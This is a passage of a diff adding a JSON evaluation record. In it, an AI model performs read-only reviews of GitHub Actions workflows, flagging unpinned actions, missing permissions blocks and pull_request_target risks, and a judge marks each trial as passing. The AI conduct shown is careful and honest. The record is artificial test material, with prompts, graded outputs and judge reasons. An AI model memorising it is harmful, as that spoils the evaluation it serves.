(2) a separate `pull_request_target`-triggered job that consumes those artifacts without ever checking out or executing the fork's code.\n- Do not \"fix\" this by merely narrowing the command — the risk is the combination of trigger, unchecked-out fork code, and execution.\n\n**Additional checks not determinable from the description (verify before finalizing the review):**\n- **Action pinning:** confirm the `actions/checkout` (and any other third-party `uses:`) is pinned to a full commit SHA, not a mutable tag such as `@v4`.\n- **`permissions:` scope:** confirm the workflow/job does not carry a workflow-level `permissions: write-all` or omit `permissions:` entirely when not all jobs need write access; confirm `id-token: write` is scoped only to a job that actually performs OIDC federation.\n- **Script injection:** confirm no `run:`/`script:` step interpolates `${{ github.event.* }}` (PR title, branch name, commit message) directly into the shell string instead of routing it through an intermediate `env:` entry.\n\n**Severity:** the `pull_request_target` + untrusted-checkout-and-execute finding is the critical one and should block merge on its own.",
+          "outputSha256": "8ec90e42bf685a4561c7c0c9f606799a61138440768e0567332ede902d4984dd",
+          "promptSha256": "466f21c826cf2b5fb1b06e933913f0f7a736c69c9a2dc644c13c07454ecf9e25",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Names the job's trigger pull_request_target plus checkout of github.event.pull_request.head.sha followed by npm run build as the pwn-request pattern. Explains base-repo secrets, write-scoped GITHUB_TOKEN, OIDC reachable from attacker-controlled fork code. Gives fix direction (switch to pull_request, or split unprivileged build + privileged artifact-consuming job) explicitly as 'report only — do not apply'. No edits claimed."
+          },
+          "passed": true
+        }
+      ]
+    },
+    {
+      "id": "unpinned-action-permissions",
+      "kind": "behavior",
+      "prompt": "Review this workflow diff: a new job adds `uses: some-org/some-action@v2` and the workflow has no permissions: block at all. What do you find?",
+      "strictness": "high",
+      "trials": 10,
+      "passes": 10,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "judge",
+      "status": "ran",
+      "trialRecords": [
+        {
+          "output": "You did not include the rest of the diff (the exact `run:` steps, trigger, other jobs, secret usage), so this is a review of just the two facts you gave me. Both are findings on their own; here is what I can say with that information, and what I would still need to see.\n\n## Findings\n\n**1. Unpinned third-party action — `uses: some-org/some-action@v2`**\n- Category: mutable-tag action pinning.\n- Consequence: `v2` is a movable tag. Whoever controls `some-org/some-action` — including anyone who compromises that org's release process or account — can repoint `v2` at new code that then runs inside your workflow with whatever credentials and token scope that job has. The pinning risk is about the tag being movable, not about trusting the maintainer today. It is a finding whether the action is first-party or not.\n- Fix direction: pin to the action's full commit SHA, e.g. `uses: some-org/some-action@<40-char-sha> # v2`. A trailing comment recording the version is fine; a bare tag is not.\n- Also worth checking while you are here: whether this action needs the token/credentials it would inherit, and whether the job's `GITHUB_TOKEN` is passed to it explicitly.\n\n**2. No `permissions:` block anywhere in the workflow**\n- Category: missing least-privilege `permissions:`.\n- Consequence: with no `permissions:` key, the workflow falls back to the repository or organization default. Where that default is permissive (and notably for older repos, and for `pull_request_target`/`workflow_dispatch`/`schedule` triggers, which get the read/write default token), every job — including this new one and every existing job — gets a write-capable `GITHUB_TOKEN`. That write scope is then reachable by any step in the workflow and by any action it invokes, including the unpinned `@v2` above. It is a finding even if every job happens to need only reads.\n- Fix direction: add an explicit workflow-level `permissions:` block set to the minimum the workflow needs (typically `contents: read`), and elevate per-job only where a specific job genuinely requires more (`id-token: write` only on the job doing OIDC federation, `pull-requests: write` only on the job commenting, etc.).\n\n**Combined effect:** the two findings compound. An unpinned action plus an over-scoped default token means a repointed tag executes with write access to the repository. Pinning and scoping are independent fixes; do both.\n\n## What I could not check from what you provided\n\nI am only flagging what the two facts support. The following categories still need the full diff before you can call this review complete:\n\n- **`pull_request_target` + untrusted checkout.** I do not know this workflow's trigger. If this job runs on `pull_request_target` and checks out the fork's head, that is a pwn-request finding independent of the two above.\n- **Script injection.** I have not seen any `run:`/`script:` step, so I cannot say whether `${{ github.event.* }}` (PR title, branch name, etc.) or an untrusted CI variable is interpolated directly into a shell string rather than routed through `env:` first.\n- **Deploy secret protection (GitLab).** Not applicable/unknown here.\n- **Removed or weakened lines.** A security-relevant line deleted elsewhere in the same diff (an existing pin downgraded, a job-level `permissions:` dropped) is a finding too; I have only the added `uses:` line.\n\n## Verification status\n\nThis review is **not** complete. Of the checks this skill requires:\n- Trigger vs. `pull_request_target` + untrusted checkout — **not yet checked** (trigger unknown).\n- Tag vs. commit-SHA pinning — **checked**, one finding.\n- Workflow/job-level `permissions:` least privilege — **checked**, one finding.\n- `${{ github.event.* }}` interpolation in `run:`/`script:` — **not yet checked** (no steps provided).\n\nI have not edited anything — this is a read-only review. Send the full diff (trigger block, all jobs, and the job's `run:`/`uses:` steps) and I can finish the remaining categories.",
+          "outputSha256": "1f83288f6bf995391b9a5c237f4e25f84533bf6ac65623c82fd1985064a7079a",
+          "promptSha256": "a4cf741e3580dc8a66d5ec93f91e22e34288785cfc05d3319a6f6fc8317ef162",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Finding 1 names some-org/some-action@v2 as a movable tag and fixes it: 'pin to the action's full commit SHA, e.g. uses: some-org/some-action@<40-char-sha> # v2'. Finding 2 flags no permissions: block, explains the permissive default grants write-capable GITHUB_TOKEN to every job, and fixes it with an explicit workflow-level permissions: block (contents: read) elevated per-job. Neither change applied; review stays read-only."
+          },
+          "passed": true
+        },
+        {
+          "output": "Findings in the changed workflow:\n\n- **Job with `uses: some-org/some-action@v2` (line unknown from diff): tag-pinned third-party action.** The action is referenced by a mutable tag (`@v2`) rather than a full commit SHA. Consequence: the tag is movable — whoever controls `some-org/some-action` (or anyone who compromises that account) can repoint `v2` at arbitrary new code, which then runs in your workflow with whatever token/permissions the job has. Since this is also a third-party action (outside your own repo's `.github/actions/`), it falls squarely under the pinning rule. Fix direction: pin to the action's full commit SHA (a `# v2` comment next to the SHA is fine; a bare tag is not).\n\n- **Workflow-level permissions: no `permissions:` block at all.** With no `permissions:` key, the workflow falls back to the repository/org default token scope, which may be `write-all` (or read-write depending on org settings) — i.e., every job, including the one running this third-party action, gets more access than it needs and more than the workflow author explicitly chose. Combined with the unpinned action above, the blast radius is worse: moved tag code runs with whatever broad scope the default grants. Fix direction: add an explicit workflow-level `permissions: contents: read` (or `permissions: {}`) and grant write scopes (`id-token: write`, `packages: write`, etc.) only at the specific job that needs them.\n\nNotes on what I did *not* find in this diff, so the review isn't overstated:\n\n- No `pull_request_target` trigger combined with an untrusted checkout is visible in this diff; if the triggering event isn't shown, I can't confirm or rule out the pwn-request pattern — flag that the trigger needs to be checked against the new job.\n- No `run:`/`script:` step interpolating `${{ github.event.* }}` is visible here, so no script-injection finding is reportable from this diff alone.\n- No deploy-secret/protected-variable handling is visible, so no GitLab-protected-variable or secret-exposure finding is reportable from this diff alone.\n\nRead-only review — I have not edited the workflow; the two findings above are for the author or the implementation skill to apply.",
+          "outputSha256": "fcbe1c65b64685f038f5c57b5a9665992f2d38071475586fbc7f0f8712888efa",
+          "promptSha256": "a4cf741e3580dc8a66d5ec93f91e22e34288785cfc05d3319a6f6fc8317ef162",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Finding 1 names some-org/some-action@v2 as a mutable tag vs full commit SHA, with fix 'pin to the action's full commit SHA'. Finding 2 flags no permissions: block, explains default may be write-all granting more than needed, fix 'add explicit workflow-level permissions: contents: read (or permissions: {})'. Both fixes given as directions, not applied; answer states read-only, no edits."
+          },
+          "passed": true
+        },
+        {
+          "output": "Findings in the changed workflow:\n\n- **Third-party action pinned to a mutable tag.** The new job's `uses: some-org/some-action@v2` references the `v2` tag rather than a full commit SHA. Tags on third-party actions are movable — the org that owns the action (or anyone who compromises that account) can repoint `v2` at different code at any time, which then runs in your workflow with whatever access the workflow grants. Fix direction: pin to `some-org/some-action`'s full commit SHA (a trailing comment noting the version, e.g. `@<sha> # v2`, is fine; the tag itself as the pin is not).\n\n- **No `permissions:` block anywhere in the workflow.** With no workflow-level or job-level `permissions:` key, the workflow inherits the repository/org default `GITHUB_TOKEN` scope, which is unrestricted (`write-all` equivalent) on repos whose default has not been narrowed to read-only. Every job in the file — not just the new one — therefore runs with write scope it almost certainly does not all need. This matters especially here because the unpinned action above runs under that same token. Fix direction: add an explicit top-level `permissions: contents: read` (or the minimum true set), and grant any `write` scope per-job only where a job demonstrably needs it.\n\nBoth findings compound: an action you cannot verify the exact code of is running with a token that, absent a `permissions:` block, may carry write access across the whole repository.\n\nI did not review the rest of the diff (triggers, other jobs' checkout/exec steps, `run:` blocks interpolating event fields) — if you can share the full changed workflow, I'll check the remaining risk categories (`pull_request_target` + untrusted checkout, script injection, GitLab variable protection if applicable).",
+          "outputSha256": "92ef5235fdf33937113264fa14f869f6fa6458a89afe278243df2adaa08fda60",
+          "promptSha256": "a4cf741e3580dc8a66d5ec93f91e22e34288785cfc05d3319a6f6fc8317ef162",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Finding 1 names `some-org/some-action@v2` as a mutable tag vs full commit SHA, with fix to pin to full SHA. Finding 2 flags no `permissions:` block, explains inherited default may be write-all/unrestricted, fix: add explicit `permissions: contents: read` narrowly scoped. Both fixes given as directions, not applied; no dismissal of the missing block."
+          },
+          "passed": true
+        },
+        {
+          "output": "Findings:\n\n- Third-party action pinned to a mutable tag: `uses: some-org/some-action@v2` references the tag `v2`, not a full commit SHA. A tag is movable — whoever controls `some-org/some-action` can repoint `v2` at different code after this review, so the workflow executes whatever that tag resolves to at run time, not what was reviewed. Fix direction: pin to the action's full commit SHA (a trailing comment noting the version, e.g. `# v2.3.1`, is fine and does not reintroduce the risk).\n\n- No `permissions:` block anywhere in the workflow: with the key absent, the workflow falls back to the repository/org default token permissions, which are frequently read-write across scopes. Every job in the workflow — including the new one and any unrelated jobs already present — receives that same broad grant. Fix direction: add a workflow-level `permissions: {}` (or the minimal read set the jobs actually need), then grant only the specific scopes each job requires at job level (e.g. `contents: read`), and `id-token: write` only on the job doing OIDC federation.\n\nTwo things I did not find, stated explicitly so they are not silently skipped:\n\n- No `pull_request_target` + untrusted-checkout-and-execute pattern was described in this diff, so that category does not apply here. If the new job runs under `pull_request_target` and checks out the contributor's head ref, that would be a finding regardless of how trivial the step looks — worth confirming against the actual trigger and job body.\n- No `run:`/`script:` step interpolating `${{ github.event.* }}` or an untrusted CI variable was described, so no script-injection finding is reported. If the new job has shell steps consuming a PR title, branch name, or commit message directly, that changes this.\n\nThis is a read-only review. I have not edited the workflow file and am not claiming any fix was applied — the pinning change and the `permissions:` addition belong to whoever implements the fix.\n\nVerification performed: the single `uses:` line in the diff was checked for tag-vs-SHA pinning (finding); the workflow was checked for a `permissions:` block at workflow and job level (finding); the described job was checked against the `pull_request_target` + untrusted-checkout pattern (not present); and no interpolated `run:`/`script:` content was in scope to check for direct injection. No category was skipped.",
+          "outputSha256": "7697df02d936ef0c5d1e2c227d6e242321eab105f10682fb51dfce48567e147f",
+          "promptSha256": "a4cf741e3580dc8a66d5ec93f91e22e34288785cfc05d3319a6f6fc8317ef162",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Finding 1 names `some-org/some-action@v2` as a mutable tag vs full commit SHA, with fix to pin to full SHA. Finding 2 flags absent permissions: block, explains default broad read-write grant, fix: add `permissions: {}` then job-level scopes. Both fixes given as directions, not applied; answer states read-only, no edits made. No fail criterion."
+          },
+          "passed": true
+        },
+        {
+          "output": "Findings:\n\n1. Third-party action pinned to a mutable tag\n   - Line/job: the new job's `uses: some-org/some-action@v2`\n   - Risk category: action pinning\n   - Consequence: `v2` is a mutable tag. Whoever controls `some-org/some-action` — now or after their account is compromised — can move `v2` to point at different code, and the next run of this workflow will execute that code with whatever access the job has. Nothing in this diff freezes the reviewed code.\n   - Fix direction: pin to the action's full commit SHA (a comment noting the human-readable version next to it is fine). This is exactly the \"leave it unpinned because it's a known org\" rationalization `rules/security.mdc` warns against — the risk is the movability of the ref, not who currently controls it.\n\n2. No `permissions:` block on the workflow\n   - Line/job: workflow level, absent entirely\n   - Risk category: least-privilege `permissions:` scope\n   - Consequence: with no `permissions:` key, the workflow inherits the repository's default token permissions, which may be read-write for all scopes depending on repo/org settings. Every job in the workflow — including the new one running an unpinned third-party action — gets that same broad scope. This combines badly with finding 1: a moved tag executes with the full default token, which can push commits, open PRs, or modify releases depending on defaults.\n   - Fix direction: add an explicit top-level `permissions: contents: read` (or narrower), then grant `id-token: write` / `contents: write` etc. only on the specific job that genuinely needs it. The new job reviewing `some-org/some-action` should be assumed to need read-only unless proven otherwise.\n\nSecondary check I could not complete from this snippet: whether the new job's trigger is `pull_request_target` and whether it checks out an untrusted fork ref before running the pinned action. I need the trigger block and any `actions/checkout` step for that job to rule out the pwn-request pattern — if the job runs on `pull_request_target` and executes `some-org/some-action` against the contributor's own head SHA, that would be a third and more severe finding, because an unpinned action running on attacker-controlled code with default token permissions is the full pwn-request combination.\n\nNo other findings from what was provided. I have not modified the workflow; the two fixes above are directions only.",
+          "outputSha256": "f1286ce4abba405267333e362c8739a94c2be5e4d78154c1a0e4b38a1fe09ef9",
+          "promptSha256": "a4cf741e3580dc8a66d5ec93f91e22e34288785cfc05d3319a6f6fc8317ef162",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Finding 1 names `some-org/some-action@v2` as a mutable tag and fixes by pinning to full commit SHA. Finding 2 flags absent workflow-level `permissions:` block, explains inherited broad default token scope, and fixes with explicit `permissions: contents: read` plus per-job narrowing. Both are directions only; answer states it did not modify the workflow. No dismissal of the missing block."
+          },
+          "passed": true
+        },
+        {
+          "output": "Findings in the changed workflow:\n\n1. **Third-party action pinned to a mutable tag** — the new job's `uses: some-org/some-action@v2`. `v2` is a tag, and tags are movable: whoever controls `some-org/some-action` (or an attacker who compromises that account, or a compromised maintainer's credentials) can repoint `v2` at different code at any time, and your workflow picks up that change on the next run with no diff in your repository to review. This is a supply-chain risk independent of how reputable the org looks today — \"it's a well-known org\" does not mitigate a movable reference. Fix direction: pin to the full commit SHA of the intended release (e.g. `some-org/some-action@<40-char-sha>`), with the tag noted only as a trailing comment for readability. This is a finding every time a third-party `uses:` resolves to a tag or branch rather than a commit SHA.\n\n2. **No `permissions:` block anywhere in the workflow** — with no workflow-level or job-level `permissions:` key, every job inherits the repository/org default token scope, which is frequently `write` across many scopes (contents, pull-requests, issues, packages, and so on). That means this new job — which presumably only needs to read the repo, or maybe nothing at all — silently carries write access it never uses. That is exactly the least-privilege gap worth flagging: a compromised or malicious action pinned to a mutable tag (finding 1) gets to act with that inherited write token. Fix direction: add an explicit `permissions:` block scoped to what the job actually needs, ideally starting from `permissions: {}` or `contents: read` at the workflow level and granting narrower scopes per job only where required (e.g. `id-token: write` only on a job doing OIDC federation).\n\nTwo caveats on scope, so the report is complete rather than overstated:\n\n- Neither finding can be fully confirmed as exploitable without seeing the trigger. If this new job runs under `pull_request_target` **and** checks out the contributor's fork head and then executes something from it, that is an additional, higher-severity finding (the pwn-request pattern) on top of the two above — flag it regardless of how trivial the executed step looks. If it runs only under `push` on a protected branch, that pattern does not apply. I'd need the trigger and the job body to say which.\n- If the `run:`/`script:` body of the new job interpolates `${{ github.event.* }}` (PR title, branch name, commit message) directly into a shell command rather than routing it through an `env:` entry first, that is a third finding. I can flag it only once I see the step body. GitLab protected-variable concerns do not apply here since this is a GitHub Actions workflow.\n\nFix direction summary, not applied: pin `some-org/some-action` to a full commit SHA, and add an explicit least-privilege `permissions:` block (workflow-level default plus per-job narrowing). I have not edited the file — this is a read-only review; the change belongs to the author or the implementation path.\n\nNot reported as findings because I have not seen the rest of the diff: any other third-party `uses:` lines, the step bodies, or the trigger configuration. Those should be checked before this review is considered complete.",
+          "outputSha256": "3614cb24d228e6195b998aac9036575a4de8a15873a7b0f3683d33e4ee8dc05e",
+          "promptSha256": "a4cf741e3580dc8a66d5ec93f91e22e34288785cfc05d3319a6f6fc8317ef162",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Finding 1 names some-org/some-action@v2 as a mutable tag and gives concrete fix: pin to full commit SHA (40-char-sha). Finding 2 flags no permissions: block, explains inherited default write scope broader than job needs, fix: explicit least-privilege permissions: {} or contents: read with per-job narrowing. Both fixes stated as not applied, read-only review. No fail criterion met."
+          },
+          "passed": true
+        },
+        {
+          "output": "Two findings, per the risk categories above:\n\n1. **Action pinned to a mutable tag** — `some-org/some-action@v2` is a third-party `uses:` reference pinned to a tag, not a full commit SHA. Tags are movable: whoever controls `some-org/some-action` (whether the original maintainer or someone who later compromises that account) can repoint `v2` at different code, and every workflow referencing it silently executes that new code on the next run, with whatever token/permissions the job has. Fix direction: pin to the action's full commit SHA (a neighboring `# v2.x.y` comment is fine for readability; the actual pin must be the SHA).\n\n2. **Missing `permissions:` block** — the workflow declares no `permissions:` key at all, so this job runs with the repository/org default token scope rather than the least privilege the job actually needs. Depending on the repo or org default, that can mean a broadly write-scoped `GITHUB_TOKEN` handed to a job that may only need `contents: read`. That default is also mutable — an org-level setting change can silently widen this job's access later without any diff in this file. Fix direction: add an explicit `permissions:` block, scoped as narrowly as the job allows (e.g. `contents: read`), ideally at the job level so other jobs in the workflow aren't affected.\n\nI did not check the rest of this diff (trigger, checkout target, `run:` interpolation, secret handling), so I can't clear those categories — only these two are confirmed from what you described. Both are fix directions only; no edit was made to the workflow.",
+          "outputSha256": "b3409d2ab687f5fccd3d01108bd7f73f9f2f1e1064a169f9eab2164934f54ddd",
+          "promptSha256": "a4cf741e3580dc8a66d5ec93f91e22e34288785cfc05d3319a6f6fc8317ef162",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Finding 1 names `some-org/some-action@v2` as a mutable tag, not a full SHA, with fix: pin to full commit SHA. Finding 2 flags no permissions: block, explains default can grant broader/write scope than job needs, fix: add explicit narrowly scoped permissions (e.g. contents: read). Both are fix directions only; no edit applied. No dismissal of the missing block."
+          },
+          "passed": true
+        },
+        {
+          "output": "Findings:\n\n- **Action pinning:** The new job's `uses: some-org/some-action@v2` is pinned to a mutable tag, not a full commit SHA. Tags are movable — whoever controls `some-org/some-action` can retag `v2` to point at new (or malicious) code, and the workflow will pick it up on the next run with no diff to review. Fix direction: pin to the full 40-character commit SHA of the intended release, with the version as a trailing comment (`uses: some-org/some-action@<full-sha> # v2.1.0`).\n\n- **Missing `permissions:` scope:** The workflow has no `permissions:` block at all. Without one, the `GITHUB_TOKEN` gets the repository/org default — which, depending on the repo/org settings, can be read-write across most scopes. Least privilege is not asserted anywhere; it is inherited from an org-level default that can change outside this diff. Fix direction: add a top-level `permissions: contents: read` (or `{}` if the workflow genuinely needs no token access), and grant any additional scope (`id-token: write`, `packages: write`, etc.) only on the specific job that needs it.\n\nOne thing that is **not** a finding from what you described: you did not mention the job's trigger, so I can't assess the `pull_request_target` + untrusted-checkout pattern here, and I'm not going to invent one. Two things are still worth confirming before this review is complete, since they fall inside the checklist and the diff alone doesn't settle them:\n\n- Check the job's trigger. If the workflow runs on `pull_request_target` and this new job checks out the contributing fork's head ref/SHA and executes anything from it (including the third-party action itself), that is a separate, higher-severity pwn-request finding — the unpinned action makes it worse, but the trigger/checkout combination is what makes it exploitable.\n- Check whether any `run:`/`script:` step in the new job interpolates `${{ github.event.* }}` (PR title, branch name, commit message) directly into the shell rather than routing it through `env:` first.\n\nSummary: two findings as stated — unpinned third-party action, and absent least-privilege `permissions:`. No edits made; this is read-only review, and the fixes above are directions for the author or the implementation skill to apply.\n\nTo finish the review per the skill's verification step, I still need: the job's trigger, whether it checks out and executes untrusted refs, and whether any `run:`/`script:` step interpolates `github.event.*` directly.",
+          "outputSha256": "bbc685ef8d297be12a3fea5b3ae9b5a2522a0c646e397c0b21ad011ed689f3a6",
+          "promptSha256": "a4cf741e3580dc8a66d5ec93f91e22e34288785cfc05d3319a6f6fc8317ef162",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Finding 1 names some-org/some-action@v2 as a mutable tag, not a full SHA, with fix to pin the 40-char SHA. Finding 2 flags no permissions: block, explains inherited org default can be read-write, fix: add top-level permissions: contents: read, scoped per job. Both fixes given as directions, no edits applied (read-only). No dismissal of the missing block."
+          },
+          "passed": true
+        },
+        {
+          "output": "Findings for this diff:\n\n1. **Unpinned third-party action (tag pinning).**\n   `uses: some-org/some-action@v2` references a mutable tag rather than a full commit SHA. Consequence: whoever controls `some-org/some-action` (or anyone who compromises that account) can move `v2` to point at different code at any time, and this workflow will silently execute the new code on the next run — no diff, no review, no warning. This is the classic supply-chain vector. Fix direction: pin to the full commit SHA of the intended release (e.g. `some-org/some-action@<40-char-sha>`), optionally with a `# v2.x.y` comment so humans can still tell which release it is. Pin every third-party `uses:` (anything outside the repo's own `.github/actions/`); the `actions/*` first-party org is not exempt.\n\n2. **No `permissions:` block anywhere in the workflow.**\n   A workflow with no `permissions:` key does not get zero permissions — it inherits the repository/organization default token scope, which is often read-write across `contents`, `issues`, `pull-requests`, and more, depending on repo settings. Consequence: every job in this workflow, including the new one, runs with whatever that default is; the new third-party action in particular now executes with that token's scope, and a compromised or malicious action version can use it. Fix direction: add an explicit least-privilege `permissions:` block — start from `permissions: {}` (or `contents: read`) at workflow level, then grant only the specific scopes each job actually needs (e.g. `id-token: write` only on a job doing OIDC federation, `pull-requests: write` only on a job that comments). Do not use `write-all`.\n\nTwo secondary points to confirm while you are in the file, since the diff is small but the surface is not:\n\n- **Trigger.** Check which trigger(s) the new job runs under. If it is `pull_request_target` and the job checks out the contributor's fork head/ref and then runs the action or any build/test/lint step against it, that is the \"pwn request\" pattern and is a separate, higher-severity finding regardless of how trivial the step looks. Report it even if the action itself seems innocuous, because the risk is the combination of privileged trigger plus untrusted checkout plus execution.\n- **Inputs.** Check how the job passes data to `some-org/some-action`. If it interpolates `${{ github.event.* }}` (PR/MR title, branch name, issue body, commit message) or another untrusted event/CI value directly into a `run:`/`script:` string rather than routing it through an `env:` (or GitLab `variables:`) entry first, that is a script-injection finding.\n\nScope note: this review is read-only. I have reported the findings and fix directions above; I have not edited the workflow and am not claiming any fix was applied. Applying the pin and the `permissions:` block is an implementation change and should go through the normal authoring/review path.\n\nSummary of confirmed findings from the diff as stated: (1) mutable-tag pin on a third-party action, (2) missing least-privilege `permissions:` block. The trigger/injection checks are conditional on the rest of the job body, which was not included.",
+          "outputSha256": "bd2b294855c49db97bd647db66b7681a0e77bb192a20e30929b42ca4cd2cc0a3",
+          "promptSha256": "a4cf741e3580dc8a66d5ec93f91e22e34288785cfc05d3319a6f6fc8317ef162",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Finding 1 names some-org/some-action@v2 as a mutable tag vs full commit SHA, with fix to pin to 40-char SHA. Finding 2 flags no permissions: block, explains inherited default scope broader than needed, fix: explicit least-privilege permissions: {} / contents: read. Both fixes given as directions, not applied; scope note confirms read-only."
+          },
+          "passed": true
+        },
+        {
+          "output": "Two findings, both in scope for this skill:\n\n**Finding 1 — unpinned third-party action (line with `uses: some-org/some-action@v2`)**\n\n`some-org/some-action@v2` is pinned to a mutable tag rather than a full commit SHA. The risk is not about who currently controls `some-org`; it is that a tag is a movable reference. Anyone who can push to that repository — the maintainer, or an attacker who compromises the maintainer's account or the repo — can repoint `v2` at different code, and this workflow will execute it on the next run with no review and no diff in your repository. Because the action runs inside your workflow, it inherits whatever token and secret context the job has.\n\nFix direction: pin to the action's full 40-character commit SHA (a `# v2.x.y` comment next to the SHA is fine and helps with updates). Move to the commit-SHA pin; a tag is only acceptable as a comment, never as the actual pin.\n\n**Finding 2 — no `permissions:` block at all**\n\nThe workflow declares no `permissions:` key, which means GitHub falls back to the repository/organization default token scope. Historically that default is read/write on most scopes, so every job in this workflow — including the new job and everything already in the file, since the omission is workflow-wide — is running with more token access than it needs. A compromised or malicious action (see Finding 1) then has that broader scope available to it, which is precisely the combination that turns an unpinned action from a nuisance into a real incident.\n\nFix direction: add an explicit workflow-level `permissions:` block set to `contents: read` (or even `{}` / `contents: none` if the workflow does not need to read repo contents), then grant only the specific scopes individual jobs actually require at the job level. If any job needs `id-token: write` for OIDC, scope that to that one job, not the workflow.\n\n**What I did not find, given the information provided**\n\n- There is no indication in the described diff of a `pull_request_target` trigger, and no checkout of an untrusted fork ref, so the pwn-request pattern does not appear here. If the workflow's trigger block was not part of what you inspected, confirm it — if this job runs under `pull_request_target` and checks out the PR head, that would be a third, higher-severity finding.\n- No `run:`/`script:` step was described, so script-injection via unsanitized `${{ github.event.* }}` interpolation cannot be assessed from this diff alone. Worth a glance at the new job if it contains shell steps.\n- No deploy secrets or credential-bearing variables were mentioned, so the secrets-scope category is not flagged here.\n\n**Note on scope:** this review is read-only — I have not modified the workflow and am not proposing to. The pinning change and the `permissions:` block are the author's (or the implementation skill's) to apply once the findings are accepted.\n\nIf you want, tell me the trigger block and whether the new job has any `run:` steps, and I can close out the two categories I could not evaluate.",
+          "outputSha256": "0d179b576e6afe5ef129cce485c13faac9b8d6c850bb74bc048b2bdaabceff30",
+          "promptSha256": "a4cf741e3580dc8a66d5ec93f91e22e34288785cfc05d3319a6f6fc8317ef162",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Finding 1 names some-org/some-action@v2 as pinned to a mutable tag, not a full commit SHA, and gives the concrete fix: pin to the full 40-char commit SHA. Finding 2 flags the absent permissions: block, explains the unscoped default grants broader access than jobs need, and gives the concrete fix: add workflow-level permissions: contents: read with job-level scoping. Neither change is applied; answer states it is read-only."
+          },
+          "passed": true
+        }
+      ]
+    }
+  ],
+  "verdict": "pass",
+  "scope": "bundled",
+  "skillDigest": "83753d444075ec56f541b6e08ff27675a30fece478c0553d74bc69a4bb837476",
+  "catalogDigest": "0cdcf6c10ab68b2f0f133eadcae9b3830e7a303cbee5b88bcdf9ca11646f38ee",
+  "judgePromptVersion": "2026-09-25.1",
+  "runner": "deepseek",
+  "model": "deepseek-chat",
+  "runnerPromptVersion": "2026-09-25.1",
+  "recordedAt": "2026-09-25T18:05:43.844Z",
+  "judge": "deepseek",
+  "judgeModel": "deepseek-chat"
+}
